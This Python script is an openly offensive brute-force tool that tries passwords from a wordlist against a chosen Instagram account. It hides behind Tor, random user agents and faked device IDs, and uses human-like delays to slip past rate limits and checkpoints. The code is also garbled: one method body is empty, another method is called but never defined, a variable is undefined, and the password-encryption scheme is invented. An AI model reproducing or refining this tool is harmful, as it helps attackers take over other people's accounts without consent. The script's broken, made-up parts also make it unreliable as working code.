import requests
import random
import time
import json
import hashlib
import hmac
import base64
import re
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import urllib.parse

class InstagramAdvancedBrute:
    def __init__(self, username, password_file):
        self.username = username
        self.passwords = open(password_file).read().splitlines()
        self.session = requests.Session()
        self.ua = UserAgent()
        self.tor_socks = ('socks5h', 'localhost', 9050)
        self.login_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.base_url = "https://www.instagram.com"
        self.api_url = "https://i.instagram.com/api/v1"
        
    def _get_random_headers(self):
        # Updated headers with more realistic values
        headers = {
            'User-Agent': self.ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'X-CSRFToken': '',
            'Origin': 'https://www.instagram.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        return headers
    
    def _tor_request(self, url, method='GET', data=None, headers=None):
        # Updated Tor request method with better error handling
        try:
            proxies = {
                'http': f'socks5://{self.tor_socks[1]}:{self.tor_socks[2]}',
                'https': f'socks5://{self.tor_socks[1]}:{self.tor_socks[2]}'
            }
            
            default_headers = self._get_random_headers()
            if headers:
                default_headers.update(headers)
                
            response = self.session.request(
                method, 
                url, 
                headers=default_headers,
                data=data, 
                proxies=proxies, 
                timeout=15
            )
            
            return response
        except Exception as e:
            print(f"[!] Tor request error: {str(e)}")
            return None
    
    def _extract_tokens(self, html):
        

    
    def _generate_enc_password(self, password, time_key):
        # Updated password encryption method
        key = time_key.encode('utf-8')
        msg = password.encode('utf-8')
        
        # Generate HMAC-SHA256
        h = hmac.new(key, msg, hashlib.sha256).digest()
        
        # Base64 encode
        enc_password = base64.b64encode(h).decode('utf-8')
        
        return f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{enc_password}"
    
    def _check_security_response(self, response):
        # Enhanced security response checking
        if not response:
            return False
            
        try:
            resp_json = response.json()
            
            if resp_json.get('message') == 'Please wait a few minutes before you try again.':
                print("[!] Rate limit hit. Waiting...")
                wait_time = random.randint(300, 600)  # 5-10 minutes
                print(f"[!] Waiting for {wait_time} seconds...")
                time.sleep(wait_time)
                return False
                
            if resp_json.get('checkpoint_required'):
                print("[!] Checkpoint required. Manual intervention needed.")
                return False
                
            if resp_json.get('error_type') == 'inactive_user':
                print("[!] Account appears to be inactive or suspended.")
                return False
                
            return True
        except:
            # If JSON parsing fails, check text response
            if 'checkpoint_required' in response.text:
                print("[!] Checkpoint required. Manual intervention needed.")
                return False
                
            if 'Please wait' in response.text:
                print("[!] Rate limit hit. Waiting...")
                time.sleep(300)
                return False
                
            return True
    
    def _get_web_session_id(self):
        
        # Add more realistic human-like behavior
        # Random mouse movements simulation time
        time.sleep(random.uniform(0.5, 2.0))
        
        # Random typing simulation time
        time.sleep(random.uniform(1.0, 3.0))
        
        # Random pause before submission
        time.sleep(random.uniform(0.5, 1.5))
    
    def brute_force(self):
        print(f"[+] Starting brute force attack on {self.username}")
        
        # Get initial session
        login_page = self._tor_request(self.base_url)
        if not login_page or login_page.status_code != 200:
            print("[!] Failed to access Instagram. Check your Tor connection.")
            return None
            
        
        
        # Process passwords in smaller batches
        for i in range(0, len(self.passwords), 5):  # Reduced batch size
            batch = self.passwords[i:i+5]
            
            for password in batch:
                try:
                    self.login_attempts += 1
                    
                    # Simulate human behavior
                    self._simulate_human_behavior()
                    
                    # Updated password encryption
                    time_key = str(int(time.time()))
                    enc_password = self._generate_enc_password(password, time_key)
                    
                    # Prepare login data with updated fields
                    data = {
                        'username': self.username,
                        'enc_password': enc_password,
                        'queryParams': '{}',
                        'optIntoOneTap': 'false',
                        'stopDeletion': 'false',
                        'trustedDevice': 'false',
                        'guid': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                        'device_id': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                        'phone_id': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                        'bloks_versioning_id': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                        'waterfall_id': hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
                    }
        
                    
                    # Make login request
                    response = self._tor_request(
                        f"{self.base_url}/accounts/login/ajax/",
                        method='POST',
                        data=data,
                        headers=headers
                    )
                    
                    if not response:
                        print("[!] No response received. Retrying with new circuit...")
                        time.sleep(random.uniform(10, 20))
                        continue
                        
                    if not self._check_security_response(response):
                        continue
                    
                    # Check for successful login
                    try:
                        resp_json = response.json()
                        if resp_json.get('authenticated'):
                            self.successful_logins += 1
                            print(f"[+] SUCCESS! Password: {password}")
                            print(f"[+] Login attempts: {self.login_attempts}")
                            return password
                        elif resp_json.get('user'):
                            # Some versions return user object instead of authenticated flag
                            self.successful_logins += 1
                            print(f"[+] SUCCESS! Password: {password}")
                            print(f"[+] Login attempts: {self.login_attempts}")
                            return password
                        else:
                            self.failed_logins += 1
                            error_msg = resp_json.get('message', 'Unknown error')
                            print(f"[-] Failed: {password} - {error_msg}")
                    except:
                        self.failed_logins += 1
                        print(f"[-] Failed: {password} - Could not parse response")
                    
                    # Random delay between attempts
                    time.sleep(random.uniform(5, 15))  # Increased delay
                    
                except Exception as e:
                    print(f"[!] Error: {str(e)}")
                    time.sleep(random.uniform(10, 20))
                    continue
                    
            # Circuit rotation between batches
            print(f"[+] Completed batch. Current stats: {self.login_attempts} attempts, "
                  f"{self.successful_logins} successes, {self.failed_logins} failures")
            time.sleep(random.uniform(30, 60))  # Longer pause between batches
            
        print("[!] Password not found in list")
        return None

if __name__ == "__main__":
    username = input("Enter Instagram username: ")
    password_file = input("Enter path to password file: ")
    brute = InstagramAdvancedBrute(username, password_file)
    result = brute.brute_force()
    
    if result:
        print(f"[+] Password found: {result}")
    else:
        print("[-] Password not found")
